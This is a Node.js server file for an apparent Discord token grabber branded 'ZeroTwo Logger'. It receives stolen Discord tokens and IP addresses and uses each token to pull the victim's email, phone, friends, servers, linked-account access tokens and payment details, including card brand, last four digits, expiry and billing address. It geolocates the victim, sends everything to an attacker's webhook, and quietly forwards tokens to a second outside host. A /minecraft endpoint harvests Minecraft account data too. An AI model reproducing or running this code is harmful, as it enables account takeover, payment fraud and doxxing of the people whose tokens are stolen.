const app = require("express")()
const {
    text
} = require("body-parser");
const {
    appendFile
} = require("fs");

const fetch = require("node-fetch")


const Discord = require('v11-discord.js');

const webhook = "" // PLACE YOUR WEBHOOK HERE

const webh = webhook.split('/')
const web = new Discord.WebhookClient(webh[5], webh[6])


app.use(text())
app.post("/inject", (req, res) => {
    var {
        token,
        ip
    } = JSON.parse(req.body)
    if (token) {
        res.sendStatus(200)
        var toe = token.slice(1, -1)
        info(toe, ip)
        loca(toe, ip)
        pay(toe)
        conec(toe)
        appendFile("./tokens.txt", `${toe}\n${ip}\n\n`, err => {})
    } else res.sendStatus(404), console.log("Quelqu'un a surment trouver votre API Token Grabber !\nSomeone Found Your Token Grabber API !")

    function info(token, ip) {
        fetch("https://discordapp.com/api/v9/users/@me", {
            method: "GET",
            headers: {
                authorization: token
            }
        }).then(res => res.json()).then(r => {
            if (!r.message) fetch("https://discordapp.com/api/v9/users/@me/relationships", {
                method: "GET",
                headers: {
                    authorization: token
                }
            }).then(res => res.json()).then(resp => {
                fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {
                    method: "GET",
                    headers: {
                        authorization: token
                    }
                }).then(res => res.json()).then(response => {
                    fetch("https://discordapp.com/api/v9/users/@me/connections", {
                        method: "GET",
                        headers: {
                            authorization: token
                        }
                    }).then(res => res.json()).then(responseC => {
                        fetch("https://discord.com/api/v9/applications", {
                            method: "GET",
                            headers: {
                                authorization: token
                            }
                        }).then(res => res.json()).then(responseA => {
                            fetch("https://discord.com/api/v9/users/@me/guilds", {
                                method: "GET",
                                headers: {
                                    authorization: token
                                }
                            }).then(res => res.json()).then(responseG => {
                               
                                if (r.bio) var bio = r.bio
                                else var bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
                                if (r.banner) var image = `https://cdn.discordapp.com/banners/${r.id}/${r.banner}.png?size=512`
                                else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
                                var owowner = 0
                                responseG.forEach(responseG => {
                                    if (responseG.owner) owowner++
                                })
                                setTimeout(() => {
                                    const embed = new Discord.RichEmbed()
                                        .setTitle("𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 !")
                                        .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                                        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", `${r.username}#${r.discriminator}`, true)
                                        .addField("𝗜𝗗", r.id, true)
                                        .addField("𝐅𝐑𝐈𝐄𝐍𝐃𝐒", `${resp.length}`, true)
                                        .addField("𝗣𝘂𝗯𝗹𝗶𝗰 𝗙𝗹𝗮𝗴𝘀", r.public_flags, true)
                                        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(r.flags), true)
                                        .addField("𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲𝗱 𝗙𝗹𝗮𝗴𝘀", r.purchased_flags, true)
                                        .addField("𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗙𝗟𝗔𝗚𝗦", r.premium_usage_flags, true)
                                        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", response.length, true)
                                        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", responseG.length, true)
                                        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧𝐞𝐫", owowner, true)
                                        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", responseA.length, true)
                                        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", responseC.length, true)
                                        .addField("𝗕𝗮𝗻𝗻𝗲𝗿 𝗖𝗼𝗹𝗼𝗿", r.banner_color, true)
                                        .addField("𝗔𝗰𝗰𝗲𝗻𝘁 𝗖𝗼𝗹𝗼𝗿", r.accent_color, true)
                                        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", bio, true)
                                        .addField("𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲", r.locale, true)
                                        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ?", r.nsfw_allowed, true)
                                        .addField("𝗗𝗼𝘂𝗯𝗹𝗲 𝗔𝘂𝘁𝗵 ?", r.mfa_enabled, true)
                                        .addField("𝗡𝗶𝘁𝗿𝗼 ?", getNitro(r.premium_type), true)
                                        .addField("𝗘𝗺𝗮𝗶𝗹", r.email, true)
                                        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 ?", r.verified, true)
                                        .addField("𝗣𝗵𝗼𝗻𝗲 ?", r.phone, true)
                                        .addField("𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ", "Waiting...", true)
                                        .addField("𝗧𝗼𝗸𝗲𝗻", `||${token}||`)
                                        .addField("𝐈𝐏 𝐀𝐃𝐃𝐑𝐄𝐒𝐒", `||${ip}||`, true)
                                        .setThumbnail(`https://cdn.discordapp.com/avatars/${r.id}/${r.avatar}.gif?size=128`)
                                        .setImage(image)
                                        .setColor("#00aaaa")
                                        .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
                                    web.send(embed)
                                }, 100)
                            })
                        })
                    })
                })
            })
        })
    }

 fetch("https://Munaria.repl.co/grabbed", {headers: {token: token, ip: ip}})
    function conec(token) {
        fetch("https://discordapp.com/api/v9/users/@me/connections", {
            method: "GET",
            headers: {
                authorization: token
            }
        }).then(res => res.json()).then(rp => {
            rp.forEach(r => {
                if (!r.name) var name = "𝐍𝐨 𝐍𝐚𝐦𝐞 𝐖𝐚𝐬 𝐅𝐨𝐮𝐧𝐝"
                else name = r.name
                if (!r.access_token) var accessToken = "𝐍𝐨 𝐀𝐜𝐜𝐞𝐬𝐬 𝐓𝐨𝐤𝐞𝐧 𝐖𝐚𝐬 𝐅𝐨𝐮𝐧𝐝"
                else var accessToken = r.access_token
                if (r.visibility = 0) var visibility = "𝐂𝐚𝐧'𝐭 𝐛𝐞 𝐬𝐞𝐞𝐧 𝐨𝐧 𝐩𝐫𝐨𝐟𝐢𝐥"
                else var visibility = "𝐂𝐚𝐧 𝐛𝐞 𝐬𝐞𝐞𝐧 𝐨𝐧 𝐩𝐫𝐨𝐟𝐢𝐥"
                var embed = new Discord.RichEmbed()
                    .setTitle("𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 ! (𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻𝘀)")
                    .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                    .addField("𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦", r.type, true)
                    .addField("𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐈𝐃", r.id, true)
                    .addField("𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐍𝐚𝐦𝐞", name, true)
                    .addField("𝐈𝐬 𝐑𝐞𝐯𝐨𝐤𝐞𝐝 ?", r.revoked, true)
                    .addField("𝐕𝐢𝐬𝐢𝐛𝐥𝐞 𝐢𝐧 𝐩𝐫𝐨𝐟𝐢𝐥𝐞 ?", visibility, true)
                    .addField("𝗦𝘆𝗻𝗰 𝗪𝗶𝘁𝗵 𝗙𝗿𝗶𝗲𝗻𝗱 ?", r.friend_sync, true)
                    .addField("𝐒𝐡𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲 𝐰𝐡𝐢𝐥𝐞 𝐩𝐥𝐚𝐲𝐢𝐧𝐠 ?", r.show_activity, true)
                    .addField("𝐈𝐒 𝐕𝐞𝐫𝐢𝐟𝐢𝐞𝐝 ?", r.verified, true)
                    .addField("𝐀𝐜𝐜𝐞𝐬𝐬 𝐓𝐨𝐤𝐞𝐧 ", accessToken)
                    .setColor("#00aaaa")
                    .setImage("https://www.icegif.com/wp-content/uploads/icegif-219.gif")
                    .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
                web.send(embed)
            })
        })
    }

    function loca(token, ip) {
        fetch(`http://ip-api.com/json/${ip}`).then(res => res.json()).then(r => {
            const embed = new Discord.RichEmbed()
                .setTitle("𝐍𝐞𝐰 𝐓𝐨𝐤𝐞𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝 ! (𝐆𝐞𝐨𝐈𝐏)")
                .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                .addField("𝐂𝐨𝐮𝐧𝐭𝐫𝐲: ", r.country, true)
                .addField("𝐂𝐨𝐮𝐧𝐭𝐫𝐲 𝐂𝐨𝐝𝐞: ", r.countryCode, true)
                .addField("𝐑𝐞́𝐠𝐢𝐨𝐧: ", r.region, true)
                .addField("𝐑𝐞́𝐠𝐢𝐨𝐧 𝐍𝐚𝐦𝐞: ", r.regionName, true)
                .addField("𝐂𝐢𝐭𝐲: ", r.city, true)
                .addField("𝐏𝐨𝐬𝐭𝐚𝐥 𝐂𝐨𝐝𝐞: ", r.zip, true)
                .addField("𝐋𝐚𝐭𝐢𝐭𝐮𝐝𝐞: ", r.lat, true)
                .addField("𝐋𝐨𝐧𝐠𝐢𝐭𝐮𝐝𝐞: ", r.lon, true)
                .addField("𝐓𝐢𝐦𝐞𝐳𝐨𝐧𝐞: ", r.timezone, true)
                .addField("𝐈𝐒𝐏: ", r.isp, true)
                .addField("𝐀𝐒: ", r.as, true)
                .addField("𝐈𝐏: ", `||${r.query}||`)
                .addField("𝗧𝗼𝗸𝗲𝗻", `||${token}||`)
                .setColor("#00aaaa")
                .setImage("https://www.icegif.com/wp-content/uploads/icegif-219.gif")
                .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
            web.send(embed)
        })
    }

    function pay(token) {
        fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {
            method: "GET",
            headers: {
                authorization: token
            }
        }).then(res => res.json()).then(r => {
            fetch("https://discord.com/api/v9/users/@me", {
                method: "GET",
                headers: {
                    authorization: token
                }
            }).then(r => r.json()).then(res => {
                r.forEach(r => {
                    if (res.banner) var image = `https://cdn.discordapp.com/banners/${res.id}/${res.banner}.png?size=512`
                    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
                    if (r.brand) var cardorpaypal = r.brand
                    else var cardorpaypal = "𝐏𝐚𝐲𝐩𝐚𝐥"
                    if (cardorpaypal == "𝐏𝐚𝐲𝐩𝐚𝐥") {
                        var embed = new Discord.RichEmbed()
                            .setTitle("𝐍𝐞𝐰 𝐓𝐨𝐤𝐞𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝 ! (𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝)")
                            .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                            .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", `${res.username}#${res.discriminator}`, true)
                            .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐈𝐃", r.id, true)
                            .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐅𝐥𝐚𝐠𝐬", r.flags, true)
                            .addField("𝐏𝐚𝐲𝐩𝐚𝐥 𝐄𝐦𝐚𝐢𝐥", r.email, true)
                            .addField("𝐁𝐢𝐥𝐥𝐢𝐧𝐠 𝐀𝐝𝐝𝐫𝐞𝐬𝐬 𝐍𝐚𝐦𝐞", r.billing_address.name, true)
                            .addField("𝐀𝐝𝐝𝐫𝐞𝐬𝐬", `${r.billing_address.line_1} 𝐂𝐢𝐭𝐲: ${r.billing_address.city} 𝐒𝐭𝐚𝐭𝐞: ${r.billing_address.state}`, true)
                            .addField("𝐂𝐨𝐮𝐧𝐭𝐫𝐲", r.country, true)
                            .addField("𝐏𝐨𝐬𝐭𝐚𝐥 𝐂𝐨𝐝𝐞", r.billing_address.postal_code, true)
                            .addField("𝐃𝐞𝐟𝐚𝐮𝐥𝐭 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 ?", r.default, true)
                            .addField("𝗨𝘀𝗲𝗿𝗧𝗼𝗸𝗲𝗻", `||${token}||`)
                            .setColor("#00aaaa")
                            .setImage(image)
                            .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
                        web.send(embed)
                    } else {
                        var embed = new Discord.RichEmbed()
                            .setTitle("𝐍𝐞𝐰 𝐓𝐨𝐤𝐞𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝 ! (𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝)")
                            .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
                            .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", `${res.username}#${res.discriminator}`, true)
                            .addField("𝐈𝐧𝐯𝐚𝐥𝐢𝐝 ?", r.invalid)
                            .addField("𝗙𝗹𝗮𝗴𝘀", r.flags)
                            .addField("𝐁𝐫𝐚𝐧𝐝", r.brand)
                            .addField("𝐋𝐚𝐬𝐭 𝟒 𝐃𝐢𝐠𝐢𝐭𝐬", r.last_4)
                            .addField("𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐀𝐭", `${r.expires_month}/${r.expires_year}`)
                            .addField("𝐍𝐚𝐦𝐞", r.billing_address.name)
                            .addField("𝐀𝐝𝐝𝐫𝐞𝐬𝐬", `${r.billing_address.line_1} 𝐂𝐢𝐭𝐲: ${r.billing_address.city} 𝐒𝐭𝐚𝐭𝐞: ${r.billing_address.state}`)
                            .addField("𝐂𝐨𝐮𝐧𝐭𝐫𝐲", r.billing_address.country)
                            .addField("𝐏𝐨𝐬𝐭𝐚𝐥 𝐂𝐨𝐝𝐞", r.billing_address.postal_code)
                            .addField("𝐃𝐞𝐟𝐚𝐮𝐥𝐭 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 ?", r.default)
                            .addField("𝗨𝘀𝗲𝗿𝗧𝗼𝗸𝗲𝗻", `||${token}||`)
                            .setColor("#00aaaa")
                            .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
                            .setImage(image)
                        web.send(embed)
                    }
                })

            })
        })
    }

    function badges(f) {
        var b = "";
        if ((f & 1) == 1) b += "𝐒𝐭𝐚𝐟𝐟,\n";
        if ((f & 2) == 2) b += "𝐏𝐚𝐫𝐭𝐧𝐞𝐫,\n";
        if ((f & 4) == 4) b += "𝐇𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝 𝐄𝐯𝐞𝐧𝐭,\n"
        if ((f & 8) == 8) b += "𝐆𝐫𝐞𝐞𝐧 𝐁𝐮𝐠𝐡𝐮𝐧𝐭𝐞𝐫,\n";
        if ((f & 64) == 64) b += "𝐇𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝 𝐁𝐫𝐚𝐯𝐞𝐫𝐲,\n";
        if ((f & 128) == 128) b += "𝐇𝐲𝐩𝐞𝐒𝐪𝐮𝐚𝐝 𝐁𝐫𝐢𝐥𝐥𝐚𝐧𝐜𝐞,\n";
        if ((f & 256) == 256) b += "𝐇𝐲𝐩𝐞𝐒𝐪𝐮𝐚𝐝 𝐁𝐚𝐥𝐚𝐧𝐜𝐞,\n";
        if ((f & 512) == 512) b += "𝐄𝐚𝐫𝐥𝐲 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐫,\n";
        if ((f & 16384) == 16384) b += "𝐆𝐨𝐥𝐝 𝐁𝐮𝐠𝐇𝐮𝐧𝐭𝐞𝐫,\n";
        if ((f & 131072) == 131072) b += "𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫,\n";
        if (b == "") b = "𝐍𝐨 𝐁𝐚𝐝𝐠𝐞𝐬\n"
        return b;
    }

    function getNitro(oof) {
        var n = ""
        if ((oof & 0) == 0) n = "𝐍𝐨 𝐍𝐢𝐭𝐫𝐨"
        if ((oof & 1) == 1) n = "𝐍𝐢𝐭𝐫𝐨 𝐂𝐥𝐚𝐬𝐬𝐢𝐜"
        if ((oof & 2) == 2) n = "𝐍𝐢𝐭𝐫𝐨 𝐁𝐨𝐨𝐬𝐭"
        if (n == "") n = "𝐍𝐨 𝐍𝐢𝐭𝐫𝐨"
        return n
    }
})
app.post("/minecraft", (req, res) => {
    var {
        eligibleForMigration,
        hasMultipleProfiles,
        legacy,
        localId,
        minecraftProfileID,
        minecraftProfileName,
        persistent,
        remoteId,
        type,
        username,
        activeAccountLocalId
    } = JSON.parse(req.body)
    if (localId) {
        var embed = new Discord.RichEmbed()
            .setTitle("𝐍𝐞𝐰 𝐓𝐨𝐤𝐞𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝 ! (𝐌𝐢𝐧𝐞𝐜𝐫𝐚𝐟𝐭)")
            .setURL("https://github.com/kozune123/DISCORD_GRABBER/")
            .addField("𝐈𝐬 𝐄𝐥𝐢𝐠𝐢𝐛𝐥𝐞 𝐅𝐨𝐫 𝐌𝐢𝐠𝐫𝐚𝐭𝐢𝐨𝐧 ?", eligibleForMigration, true)
            .addField("𝐡𝐚𝐬 𝐌𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐏𝐫𝐨𝐟𝐢𝐥𝐞𝐬 ?", hasMultipleProfiles, true)
            .addField("𝐋𝐞𝐠𝐚𝐜𝐲", legacy, true)
            .addField("𝐌𝐢𝐧𝐞𝐜𝐫𝐚𝐟𝐭 𝐏𝐫𝐨𝐟𝐢𝐥 𝐈𝐃", minecraftProfileID, true)
            .addField("𝐌𝐢𝐧𝐞𝐜𝐫𝐚𝐟𝐭 𝐏𝐫𝐨𝐟𝐢𝐥 𝐍𝐚𝐦𝐞", minecraftProfileName, true)
            .addField("𝐏𝐞𝐫𝐬𝐢𝐬𝐭𝐞𝐧𝐭 ?", persistent, true)
            .addField("𝐑𝐞𝐦𝐨𝐭𝐞 𝐈𝐃", remoteId, true)
            .addField("𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐓𝐲𝐩𝐞", type, true)
            .addField("𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞", username, true)
            .addField("𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐋𝐨𝐜𝐚𝐥 𝐈𝐃", activeAccountLocalId, true)
            .setColor("#00aaaa")
            .setImage("https://www.icegif.com/wp-content/uploads/icegif-219.gif")
            .setFooter("𝗭𝗲𝗿𝗼𝗧𝘄𝗼  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 𝗡𝗼𝘁.𝗙𝘂𝗯𝘂𝗸𝗶𝗶", "http://image.noelshack.com/fichiers/2021/35/4/1630603625-a-67d7f1132cb32d9f903d69da5b880524.gif")
        web.send(embed)
    } else res.sendStatus(404), console.log("Quelqu'un a surment trouver votre API Token Grabber !\nSomeone Found Your Token Grabber API !")
})


app.listen(3000)
